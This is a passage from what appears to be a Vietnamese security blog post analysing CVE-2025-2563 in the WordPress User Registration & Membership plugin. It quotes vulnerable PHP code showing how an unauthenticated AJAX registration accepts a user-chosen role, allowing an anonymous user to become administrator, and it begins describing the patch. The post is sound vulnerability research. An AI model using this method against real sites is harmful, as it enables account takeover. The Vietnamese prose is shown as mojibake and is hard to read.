2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin WordPress &lt;strong&gt;User Registration &amp;amp; Membership&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;tr∆∞·ªõc 4.1.2&lt;/strong&gt; &lt;strong&gt;kh√¥ng ngƒÉn ch·∫∑n ng∆∞·ªùi d√πng t·ª± thi·∫øt l·∫≠p vai tr√≤ t√†i kho·∫£n&lt;/strong&gt; khi &lt;strong&gt;Membership Addon ƒë∆∞·ª£c k√≠ch ho·∫°t&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;l·ªó h·ªïng leo thang ƒë·∫∑c quy·ªÅn&lt;/strong&gt; v√† cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c&lt;/strong&gt; gi√†nh ƒë∆∞·ª£c &lt;strong&gt;quy·ªÅn qu·∫£n tr·ªã (admin)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2563&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2563&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/user-registration/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;User Registration&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.2&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt lo·∫°t c√°c action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function add_ajax_events() {&#xA;    $ajax_events = array(&#xA;        &amp;#39;create_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;update_membership&amp;#39;          =&amp;gt; false,&#xA;        &amp;#39;delete_memberships&amp;#39;         =&amp;gt; false,&#xA;        &amp;#39;update_membership_status&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;create_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;update_member&amp;#39;              =&amp;gt; false,&#xA;        &amp;#39;delete_members&amp;#39;             =&amp;gt; false,&#xA;        &amp;#39;confirm_payment&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;create_stripe_subscription&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;register_member&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;validate_coupon&amp;#39;            =&amp;gt; true,&#xA;        &amp;#39;cancel_subscription&amp;#39;        =&amp;gt; false,&#xA;        &amp;#39;get_group_memberships&amp;#39;      =&amp;gt; false,&#xA;        &amp;#39;create_membership_group&amp;#39;    =&amp;gt; false,&#xA;        &amp;#39;delete_membership_groups&amp;#39;   =&amp;gt; false,&#xA;        &amp;#39;verify_pages&amp;#39;               =&amp;gt; false,&#xA;        &amp;#39;validate_pg&amp;#39;                =&amp;gt; false,&#xA;    );&#xA;    foreach ( $ajax_events as $ajax_event =&amp;gt; $nopriv ) {&#xA;        add_action( &amp;#39;wp_ajax_user_registration_membership_&amp;#39; . $ajax_event, array( __CLASS__, $ajax_event ) );&#xA;        if ( $nopriv ) {&#xA;&#xA;            add_action(&#xA;                &amp;#39;wp_ajax_nopriv_user_registration_membership_&amp;#39; . $ajax_event,&#xA;                array(&#xA;                    __CLASS__,&#xA;                    $ajax_event,&#xA;                )&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong danh s√°ch &lt;code&gt;$ajax_events&lt;/code&gt;, action &lt;strong&gt;&lt;code&gt;register_member&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c ƒë√°nh d·∫•u &lt;code&gt;true&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;register_member&amp;#39; =&amp;gt; true,&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† plugin ƒëƒÉng k√Ω c·∫£:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_ajax_user_registration_membership_register_member&#xA;wp_ajax_nopriv_user_registration_membership_register_member&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_*&lt;/code&gt; ‚Üí cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; ‚Üí cho ng∆∞·ªùi d√πng &lt;strong&gt;ch∆∞a ƒëƒÉng nh·∫≠p (unauthenticated)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;V√¨ v·∫≠y, &lt;strong&gt;b·∫•t k·ª≥ ai c≈©ng c√≥ th·ªÉ g·ª≠i request t·ªõi endpoint n√†y&lt;/strong&gt;, k·ªÉ c·∫£ attacker ch∆∞a x√°c th·ª±c.&lt;/p&gt;&#xA;&lt;p&gt;Khi request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi param &lt;code&gt;action=user_registration_membership_register_member&lt;/code&gt; th√¨ callback &lt;code&gt;register_member&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function register_member() {&#xA;    ur_membership_verify_nonce( &amp;#39;ur_members_frontend&amp;#39; ); // nonce verification.&#xA;    if ( ! isset( $_POST[&amp;#39;members_data&amp;#39;] ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Field members data is required.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $data = apply_filters( &amp;#39;user_registration_membership_before_register_member&amp;#39;, isset( $_POST[&amp;#39;members_data&amp;#39;] ) ? (array) json_decode( wp_unslash( $_POST[&amp;#39;members_data&amp;#39;] ), true ) : array() );&#xA;&#xA;    if ( ! isset( $data[&amp;#39;username&amp;#39;] ) ) {&#xA;        wp_send_json_error(&#xA;            array(&#xA;                &amp;#39;message&amp;#39; =&amp;gt; __( &amp;#39;Field username is required.&amp;#39;, &amp;#39;user-registration&amp;#39; ),&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    $membership_service      = new MembershipService();&#xA;    $response                = $membership_service-&amp;gt;create_membership_order_and_subscription( $data );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;register_member()&lt;/code&gt; th·ª±c hi·ªán ki·ªÉm tra &lt;strong&gt;nonce&lt;/strong&gt; b·∫±ng c√°ch g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;ur_membership_verify_nonce( &amp;#39;ur_members_frontend&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;ur_members_frontend&lt;/code&gt;, c√≥ th·ªÉ th·∫•y &lt;strong&gt;nonce ƒë∆∞·ª£c t·∫°o v·ªõi key &lt;code&gt;_nonce&lt;/code&gt;&lt;/strong&gt; thu·ªôc ƒë·ªëi t∆∞·ª£ng &lt;strong&gt;&lt;code&gt;ur_membership_frontend_localized_data&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/nonce.png&#34; title=&#34;Nonce&#34; data-thumbnail=&#34;/posts/2026-01-07-cve-2025-2563/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-07-cve-2025-2563/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;708&#34; width=&#34;1638&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Key v√† value n√†y ƒë∆∞·ª£c th√™m v√†o &lt;strong&gt;response khi truy c·∫≠p endpoint &lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-07-cve-2025-2563/value.png&#34; title=&#34;Nonce in response&#34; data-thumbnail=&#34;/posts/2026-01-07-cve-2025-2563/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Nonce in response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-07-cve-2025-2563/value.png&#39; alt=&#34;Value&#34; height=&#34;565&#34; width=&#34;1558&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;M·∫∑c ƒë·ªãnh, endpoint &lt;strong&gt;&lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/strong&gt; ch·ªâ h·ªó tr·ª£ ƒëƒÉng k√Ω t√†i kho·∫£n v√† &lt;strong&gt;ch∆∞a th·ªÉ ƒëƒÉng k√Ω membership&lt;/strong&gt; n·∫øu module &lt;strong&gt;Membership&lt;/strong&gt; ch∆∞a ƒë∆∞·ª£c k√≠ch ho·∫°t.&#xA;ƒê·ªÉ s·ª≠ d·ª•ng ƒë·∫ßy ƒë·ªß ch·ª©c nƒÉng, c·∫ßn truy c·∫≠p &lt;strong&gt;&lt;code&gt;/wp-admin/admin.php?page=user-registration-dashboard#/features&lt;/code&gt;&lt;/strong&gt; v√† b·∫≠t module &lt;strong&gt;Membership&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&lt;p&gt;Sau khi ki·ªÉm tra &lt;strong&gt;nonce&lt;/strong&gt;, h√†m s·∫Ω l·∫•y d·ªØ li·ªáu t·ª´ &lt;strong&gt;&lt;code&gt;$_POST[&#39;members_data&#39;]&lt;/code&gt;&lt;/strong&gt;, th·ª±c hi·ªán &lt;strong&gt;&lt;code&gt;json_decode&lt;/code&gt;&lt;/strong&gt;, chuy·ªÉn th√†nh &lt;strong&gt;m·∫£ng&lt;/strong&gt; v√† g√°n v√†o bi·∫øn &lt;strong&gt;&lt;code&gt;$data&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = apply_filters(&#xA;    &amp;#39;user_registration_membership_before_register_member&amp;#39;,&#xA;    isset( $_POST[&amp;#39;members_data&amp;#39;] )&#xA;        ? (array) json_decode( wp_unslash( $_POST[&amp;#39;members_data&amp;#39;] ), true )&#xA;        : array()&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;strong&gt;&lt;code&gt;$data[&#39;username&#39;]&lt;/code&gt;&lt;/strong&gt; t·ªìn t·∫°i, h√†m s·∫Ω ti·∫øp t·ª•c g·ªçi &lt;strong&gt;&lt;code&gt;create_membership_order_and_subscription()&lt;/code&gt;&lt;/strong&gt; ƒë·ªÉ x·ª≠ l√Ω ƒëƒÉng k√Ω th√†nh vi√™n.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function create_membership_order_and_subscription( $data ) {&#xA;    try {&#xA;        $this-&amp;gt;members_repository-&amp;gt;wpdb()-&amp;gt;query( &amp;#39;START TRANSACTION&amp;#39; ); // Start the transaction.&#xA;        $members_data = $this-&amp;gt;members_service-&amp;gt;prepare_members_data( $data );&#xA;        $member       = get_user_by( &amp;#39;login&amp;#39;, $data[&amp;#39;username&amp;#39;] );&#xA;&#xA;        //update user source and add membership_role&#xA;        $this-&amp;gt;members_service-&amp;gt;update_user_meta( $members_data, $member-&amp;gt;ID );&#xA;        ...&#xA;    } catch ( Exception $e ) {&#xA;        ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong h√†m &lt;code&gt;create_membership_order_and_subscription()&lt;/code&gt;, d·ªØ li·ªáu ng∆∞·ªùi d√πng ƒë∆∞·ª£c x·ª≠ l√Ω th√¥ng qua &lt;code&gt;prepare_members_data( $data )&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function prepare_members_data( $data ) {&#xA;    if ( ! isset( $data[&amp;#39;role&amp;#39;] ) ) {&#xA;        $membership_details = $this-&amp;gt;membership_repository-&amp;gt;get_single_membership_by_ID( absint( $data[&amp;#39;membership&amp;#39;] ) );&#xA;        $membership_meta    = json_decode( $membership_details[&amp;#39;meta_value&amp;#39;], true );&#xA;        $data[&amp;#39;role&amp;#39;]       = $membership_meta[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&#xA;    }&#xA;    $role = $data[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&#xA;&#xA;    $coupon_details = array();&#xA;    if ( isset( $data[&amp;#39;coupon&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $data[&amp;#39;coupon&amp;#39;] ) &amp;amp;&amp;amp; ur_check_module_activation( &amp;#39;coupon&amp;#39; ) ) {&#xA;        $coupon_details = ur_get_coupon_details( sanitize_text_field( $data[&amp;#39;coupon&amp;#39;] ) );&#xA;    }&#xA;&#xA;    $user_data = array(&#xA;        &amp;#39;user_login&amp;#39;    =&amp;gt; !empty( $data[&amp;#39;username&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;username&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_email&amp;#39;    =&amp;gt; !empty($data[&amp;#39;email&amp;#39;]) ?  sanitize_email( $data[&amp;#39;email&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_pass&amp;#39;     =&amp;gt; !empty($data[&amp;#39;password&amp;#39;]) ? $data[&amp;#39;password&amp;#39;] : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_nicename&amp;#39; =&amp;gt; (!empty($data[&amp;#39;firstname&amp;#39;]) &amp;amp;&amp;amp; !empty($data[&amp;#39;lastname&amp;#39;])) ? sanitize_text_field( $data[&amp;#39;firstname&amp;#39;] ) . &amp;#39; &amp;#39; . sanitize_text_field( $data[&amp;#39;lastname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;display_name&amp;#39;  =&amp;gt; !empty($data[&amp;#39;username&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;username&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;first_name&amp;#39;    =&amp;gt; !empty($data[&amp;#39;firstname&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;firstname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;last_name&amp;#39;     =&amp;gt; !empty($data[&amp;#39;lastname&amp;#39;]) ? sanitize_text_field( $data[&amp;#39;lastname&amp;#39;] ) : &amp;#39;&amp;#39;,&#xA;        &amp;#39;user_status&amp;#39;   =&amp;gt; isset( $data[&amp;#39;member_status&amp;#39;] ) ? absint( $data[&amp;#39;member_status&amp;#39;] ) : 1,&#xA;    );&#xA;&#xA;    $membership_data = array(&#xA;        &amp;#39;membership&amp;#39;     =&amp;gt; absint( $data[&amp;#39;membership&amp;#39;] ),&#xA;        &amp;#39;start_date&amp;#39;     =&amp;gt; date( &amp;#39;Y-m-d&amp;#39;, strtotime( $data[&amp;#39;start_date&amp;#39;] ) ),&#xA;        &amp;#39;payment_method&amp;#39; =&amp;gt; sanitize_text_field( $data[&amp;#39;payment_method&amp;#39;] ?? &amp;#39;&amp;#39; ),&#xA;    );&#xA;&#xA;    return array(&#xA;        &amp;#39;role&amp;#39;            =&amp;gt; sanitize_text_field( $role ),&#xA;        &amp;#39;membership_data&amp;#39; =&amp;gt; $membership_data,&#xA;        &amp;#39;coupon_data&amp;#39;     =&amp;gt; $coupon_details,&#xA;        &amp;#39;user_data&amp;#39;       =&amp;gt; $user_data&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;strong&gt;&lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt; kh√¥ng t·ªìn t·∫°i&lt;/strong&gt;, h·ªá th·ªëng s·∫Ω l·∫•y role t·ª´ &lt;strong&gt;metadata c·ªßa g√≥i membership&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data[&amp;#39;role&amp;#39;] = $membership_meta[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ng∆∞·ª£c l·∫°i, n·∫øu &lt;strong&gt;&lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn t·ª´ request&lt;/strong&gt;, gi√° tr·ªã n√†y s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng tr·ª±c ti·∫øp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$role = $data[&amp;#39;role&amp;#39;] ?? &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau ƒë√≥ role ƒë∆∞·ª£c ƒë∆∞a v√†o d·ªØ li·ªáu tr·∫£ v·ªÅ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return array(&#xA;    &amp;#39;role&amp;#39; =&amp;gt; sanitize_text_field( $role ),&#xA;    ...&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y ƒë·ªìng nghƒ©a v·ªõi vi·ªác &lt;strong&gt;ng∆∞·ªùi d√πng c√≥ th·ªÉ t·ª± truy·ªÅn tham s·ªë &lt;code&gt;role&lt;/code&gt; trong request&lt;/strong&gt; v√† &lt;strong&gt;ghi ƒë√® role m·∫∑c ƒë·ªãnh&lt;/strong&gt;, d·∫´n ƒë·∫øn kh·∫£ nƒÉng &lt;strong&gt;t·ª± g√°n quy·ªÅn cao h∆°n (v√≠ d·ª•: administrator)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ h·ªá th·ªëng l·∫•y th√¥ng tin user b·∫±ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$member = get_user_by( &amp;#39;login&amp;#39;, $data[&amp;#39;username&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ti·∫øp theo, h√†m g·ªçi &lt;code&gt;update_user_meta()&lt;/code&gt; ƒë·ªÉ c·∫≠p nh·∫≠t &lt;strong&gt;user meta&lt;/strong&gt; v√† &lt;strong&gt;membership_role&lt;/strong&gt; cho ng∆∞·ªùi d√πng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_user_meta( $data, $new_user_id ) {&#xA;    $user = new \WP_User( $new_user_id );&#xA;    update_user_meta( $new_user_id, &amp;#39;ur_registration_source&amp;#39;, &amp;#39;membership&amp;#39; );&#xA;    $user-&amp;gt;set_role( $data[&amp;#39;role&amp;#39;] );&#xA;    if ( ! empty( $data[&amp;#39;coupon_data&amp;#39;] ) ) {&#xA;        update_user_meta( $new_user_id, &amp;#39;ur_coupon_discount_type&amp;#39;, $data[&amp;#39;coupon_data&amp;#39;][&amp;#39;coupon_discount_type&amp;#39;] );&#xA;        update_user_meta( $new_user_id, &amp;#39;ur_coupon_discount&amp;#39;, $data[&amp;#39;coupon_data&amp;#39;][&amp;#39;coupon_discount&amp;#39;] );&#xA;    }&#xA;&#xA;    return $user;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;update_user_meta&lt;/code&gt; t·∫°o ƒë·ªïi t∆∞·ª£ng &lt;code&gt;WP_User&lt;/code&gt; t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;id=$new_user_id&lt;/code&gt;, Thi·∫øt l·∫≠p role cho user tr·ª±c ti·∫øp t·ª´ d·ªØ li·ªáu ƒë·∫ßu v√†o:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$user-&amp;gt;set_role( $data[&amp;#39;role&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kh√¥ng c√≥ b·∫•t k·ª≥ b∆∞·ªõc ki·ªÉm tra, gi·ªõi h·∫°n ho·∫∑c whitelist role h·ª£p l·ªá n√†o tr∆∞·ªõc khi g√°n role =&amp;gt; &lt;strong&gt;Privilege Escalation&lt;/strong&gt; x·∫£y ra.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;Khi th·ª±c hi·ªán submit form ƒëƒÉng k√Ω member t·ª´ endpoint &lt;code&gt;/membership-registration/&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Request ƒë·∫ßu ti√™n s·∫Ω th·ª±c hi·ªán ƒëƒÉng k√Ω user v·ªõi action &lt;code&gt;user_registration_user_form_submit&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Sau ƒë√≥ request v·ªõi action &lt;code&gt;user_registration_membership_register_member&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ ƒëƒÉng k√Ω membership&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&lt;p&gt;B·∫£n v√° ƒë√£ &lt;strong&gt;lo·∫°i b·ªè ho√†n to√†n vi·ªác l·∫•y role t·ª´ d·ªØ li·ªáu ng∆∞·ªùi d√πng g·ª≠i l√™n&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Trong h√†m &lt;code&gt;prepare_members_data()&lt;/code&gt; m·ªõi, role ƒë∆∞·ª£c x√°c ƒë·ªãnh &lt;strong&gt;ch·ªâ t·ª´ metadata c·ªßa membership trong database&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$membership_details = $this-&amp;gt;membership_repository-&amp;gt;get_single_membership_by_ID( absint( $data[&amp;#39;membership&amp;#39;] ) );&#xA;$membership_meta    = json_decode( $membership_details[&amp;#39;meta_value&amp;#39;], true );&#xA;$role               = isset( $membership_meta[&amp;#39;role&amp;#39;] ) ? $membership_meta[&amp;#39;role&amp;#39;] : &amp;#39;subscriber&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kh√¥ng c√≤n s·ª≠ d·ª•ng &lt;code&gt;$data[&#39;role&#39;]&lt;/code&gt;, do ƒë√≥ &lt;strong&gt;ng∆∞·ªùi d√πng kh√¥ng th·ªÉ 